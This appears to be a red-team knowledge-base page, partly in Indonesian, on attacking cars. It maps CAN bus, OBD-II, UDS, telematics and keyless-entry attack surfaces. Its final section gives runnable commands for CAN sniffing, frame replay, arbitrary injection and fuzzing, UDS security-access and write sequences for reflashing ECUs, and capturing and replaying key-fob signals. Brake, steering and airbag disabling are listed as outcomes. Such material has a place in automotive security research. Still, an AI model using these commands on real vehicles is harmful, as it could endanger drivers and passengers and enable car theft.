---
title: Attack Perspective — Automotive & CAN Bus (Red Team)
tags:
- attack
- red-team
- automotive
- can-bus
- uds
- ecu
- remote-keyless
- telematics
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# Automotive & CAN Bus — Perspektif Penyerang

> Mobil modern = CAN bus network + ECU + telematics. Red team serang: CAN injection (brake/steering), ECU flash, remote keyless (Rolljam), OBD-II access, telematics exploit.

## 1. Attack Surface Automotive

| Komponen | Vektor | MITRE ID | Tool / Teknik | Evasion | Detection Gap |
|----------|--------|----------|---------------|---------|----------------|
| **CAN Bus** | Frame inject → ECU command (brake, steering, throttle) | T0831 | can-utils, SocketCAN, custom | CAN = no auth, broadcast | CAN IDS = rare |
| **OBD-II** | Physical access → UDS → ECU read/write | T0855 | ScanTool, UDS python, can-utils | OBD = legit diagnostic port | OBD audit = none |
| **ECU Flash** | Firmware modify → persistent backdoor | T0839 | Bootloader exploit, custom flash | ECU = trusted flash | ECU verify = rare |
| **Remote Keyless** | Rolljam (replay), relay attack, brute rolling code | T1557 | HackRF, Yard Stick One, Proxmark3 | Replay = valid signal | Keyless = no detect |
| **Telematics (4G/5G)** | Remote compromise via cellular | T1190 | Cellular module exploit, unsupported update | Cellular = external surface | Telematics audit = rare |
| **Infotainment** | USB/Bluetooth exploit → pivot ke CAN | T1190 | USB hijack, BLE exploit | Infotainment = less protected | Infotainment audit = rare |
| **TPMS** | Tire sensor spoof → false reading | T1557 | SDR capture TPMS | 433 MHz = no auth | TPMS = no security |
| **Key Fob UDS** | 2015+ key fob encrypt → relay | T1557 | Relay station (2 man) | Relay = valid signal | Keyless = no detect |

## 2. CAN Bus Attack Chain

```
Access CAN:
  ├── OBD-II port (physical)
  ├── Infotainment exploit → CAN gateway
  ├── Telematics (remote) → CAN gateway
  └→ Wireless (if vulnerable module)
    ↓
Recon CAN:
  ├── candump → listen frames → identify ID (0x123 = brake, 0x456 = speed)
  ├── Map: periodic frames → ECU response
  └→ Identify: critical control frame (brake, steering, throttle)
    ↓
Inject:
  ├── cansend can0 123#AABBCCDD (raw frame)
  ├── UDS (ISO 14229): diagnostic session → write memory
  ├── OBD-II (ISO 15765): emission/service request
  └→ Frame rate: match ECU frequency → accepted
    ↓
Impact:
  ├── Brake disable / emergency brake
  ├── Steering angle override
  ├── Throttle manipulation
  ├── Speedometer spoof
  └→ Airbag disable (safety-critical)
    ↓
Evasion: CAN = no auth, no logging → silent (ECU trusted frame source)
```

## 3. Remote Keyless Attack (Rolljam)

```
Setup: HackRF / Yard Stick One → capture RF
    ↓
Rolljam (Rolling Code Intercept):
  ├── User presses lock → attacker jam signal + capture
  ├── User presses again → attacker jam + capture
  ├── First code = still valid (rolling code window)
  → Replay first code → unlock/door access
    ↓
Relay Attack:
  ├── Attacker 1 (near car) + Attacker 2 (near owner)
  ├── Relay signal car ↔ key fob
  └→ Car thinks key is present → unlock/start
    ↓
Brute (older systems):
  ├── Fixed code → capture → replay (trivial)
  ├── Proprietary rolling → weak PRNG → predict
  └→ DST80 (2015+) → encrypted → relay only
```

## 4. UDS Diagnostic Attack

```
Setup: OBD-II cable / wireless OBD dongle (ELM327)
    ↓
Connect: UDS (ISO 14229) over CAN
  ├── 10 03 → Diagnostic Session Control (extended)
  ├── 27 XX → Security Access → seed → key (auth bypass via key fuzz)
  └→ 2E / 22 → Write/Read Data By Identifier
    ↓
Exploit:
  ├── Write ECU data (VIN, config, firmware)
  ├── Bootloader access → custom firmware
  ├── Reset ECU → DoS
  └→ Freeze frame → data extraction
    ↓
Persistence: Custom firmware → persistent control
```

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **can-utils** (cansend, candump) | CAN read/write |
| **SocketCAN** | Linux CAN interface |
| **ELM327** | OBD-II dongle (cheap entry) |
| **UDS python** (udsoncan) | Diagnostic session exploit |
| **HackRF One** | RF capture/replay (keyless) |
| **Yard Stick One** | 433/915 MHz capture |
| **Proxmark3** | RFID/key playback |

## 6. Referensi
- CAN Bus Protocol — https://www.csselectronics.com/...
- car hacking research — https://github.com/CarHackingVillage
- UDS (ISO 14229) — https://www.iso.org/standard/78879.html
- Rolljam Research — https://samvartaka.github.io/...
- CAN bus car hacking (Charlie Miller) — https://www.blackhat.com/us-15/...

## Konkret — CAN Bus Exploit Payload (Testable)

### CAN Bus Sniffing (ELM327 / can-utils)

```bash
# 1. Hardware: ELM327 OBD2 → USB, atau CAN-USB adapter
# 2. Linux can-utils
sudo modprobe can
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# Sniff all CAN frames
candump can0
# Output: <iface> <id> <dlc> <data>
#   can0 123#0102030405060708

# Filter by ID
candump can0,123:7ff
```

### CAN Bus Injection (Replay + Spoofing)

```bash
# 1. Capture specific frame (e.g., door unlock)
candump -l can0    # log to file
# 2. Replay: send logged frame
canplayer -I candump-2024-01-01.log
# 3. Direct injection (arbitrary frame)
cansend can0 123#DEADBEEF
# 4. Fuzzing (all IDs, random data)
cansend can0 000#$(head -c 8 /dev/urandom | xxd -p)
```

### UDS (Unified Diagnostic Services, ISO 14229)

```bash
# UDS diagnostic session (0x10) → unlock ECU
# 1. Send diagnostic session control (extended)
cansend can0 7DF#0203140300000000
# 2. Security access (0x27) → seed/key challenge
# Request seed
cansend can0 7DF#0227010000000000
# Response: 0x27 0x01 <seed>
# Calculate key (vendor algo) → send
cansend can0 7DF#0427020304000000   # seed response
# 3. Write data by identifier (0x2E) → flash firmware
cansend can0 7DF#042E0101AA000000   # write identifier
```

### Remote Keyless (Rolling Code Replay)

```bash
# 1. SDR (HackRF / RTL-SDR) → capture key fob signal (433MHz)
rtl_sdr -f 433920000 -s 250000 -g 40 - > capture.bin
# 2. Analyse dengan inspectrum / Universal Radio Hacker
# 3. Record + replay
# HackRF: replay key fob signal
hackrf_transfer -t key.bin -f 433920000 -s 2000000
# Rolling code (Keeloq): harus capture + record + jam + replay
# Timing must match window between capture and replay
```
---

audited
---
